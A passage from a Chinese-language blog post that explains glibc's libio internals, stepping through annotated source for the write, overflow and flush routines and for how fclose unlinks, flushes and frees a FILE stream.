f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"><span class="comment">//清空缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 todo 还有剩余（即剩余空间不够）或 must_flush 被置为 1 的情况（即上面有 flush 的情况），需要做如下的处理：</p><ul><li>先调用_IO_OVERFLOW 将前面写满的 buffer 写入物理文件中，如果此时写入失败的话，那就需要做处理，如果 to_do == 0，即本次要写入的东西都写到缓冲 buffer 里面了，所以是写入失败的，需要返回 EOF，否则，说明 n - todo 字节的 buffer 被写入缓冲了。</li><li>计算当前文件流对象的 buffer 大小 block_size(即_IO_buf_end-_IO_buf_base)，如果 block_size 大于 128，则计算剩余未写入字节的余数 to_do % block_size，否则置为 0，计算 do_write 为剩余字节数减去上面计算处出的对齐余数。所以作用是将剩余的未写入字节数规整为 m*block_size + 剩余未满 block_size 字节的部分。</li><li>调用 new_do_write 写入上面计算出的一整块数据（这些数据大小是 m 个 buffer 缓冲区大小），注意，这里返回的实际写入字节数 count 如果小于我们前面计算的 do_write 大小，那就直接返回已写入的字节数 n - to_do（说明有写入失败的情况存在）。</li><li>最后，如果还有字节没有写入，那就需要调用_IO_default_xsputn 进行剩余字节的写入。</li><li>最后的返回信息仍然是 n - to_do 字节</li></ul><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>先看_IO_OVERFLOW (f, EOF) </p><p>其调用__overflow</p><p>代码位于libio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;<span class="comment">//文件不允许写入</span></span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">  f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;<span class="comment">//切换为写入模式</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">  f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其又调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_new_file_write (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">ssize_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">ssize_t</span> count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);<span class="comment">//write_base后移</span></span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果buf全满了</p><p>又会使用_IO_do_flush,相当于调用_IO_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h3 id="0x31"><a href="#0x31" class="headerlink" title="0x31"></a>0x31</h3><p>new_do_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-IO-default-xsputn"><a href="#0x4-IO-default-xsputn" class="headerlink" title="0x4_IO_default_xsputn"></a>0x4_IO_default_xsputn</h2><ul><li><p>处理局部变量赋值，同时考虑写入 size 小于等于 0 的情况，直接返回 0</p></li><li><p>开始循环处理 data 数据</p><p>如果还有剩余缓存空间，计算剩余缓存空间数量 count</p><p>如果缓存空间比要写入的字节数量多，那就更新 count 为需要写入字节数；</p><p>如果需要写入字节数大于 20，那就调用__mempcpy 写入</p><p>否则就使用循环赋值的方式进行赋值（<strong>注意这里就是 Glibc 的精髓所在了，正常我们写代码可能就考虑循环赋值或者 memcpy 解决这个问题了，但是这里区分了情况，应该是考虑到了两者的性能差，为了达到最优情况，使用了分段处理的方式</strong>）</p></li><li><p>循环结束条件是剩余写入字符为 0，或调用_IO_OVERFLOW 写入 buffer 的同时写入下一个字符成功</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><p>fclose实际上是_IO_new_fclose,位于libcio/iofclose.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment"> the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.step);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.step);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_deallocate_file (fp);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-3"><a href="#0x1-3" class="headerlink" title="0x1"></a>0x1</h2><p>首先调用_IO_un_link将_IO_FILE从_IO_list_all解除,文件位于libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历寻找当前_IO_FILE将其解链</p><p>并进行其他一些参数设置</p><h2 id="0x2-3"><a href="#0x2-3" class="headerlink" title="0x2"></a>0x2</h2><p>再往后便是_IO_FINISH,其也是一个调用vtable中函数的宏</p><p>其调用的是_IO_new_file_finish,位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_do_flush会将_IO_FILE中的缓存输出</p><p>之后再调用系统调用close关闭文件流</p><p>再运行_IO_default_finish</p><p>位于libcio/genops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除缓冲区并再次_IO_unlink</p><h2 id="0x3-3"><a href="#0x3-3" class="headerlink" title="0x3"></a>0x3</h2><p>回到_IO_new_fclose</p><p>在设置一些参数之后最后调用_IO_deallocate_file</p><p>其位于libio/libioP.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span 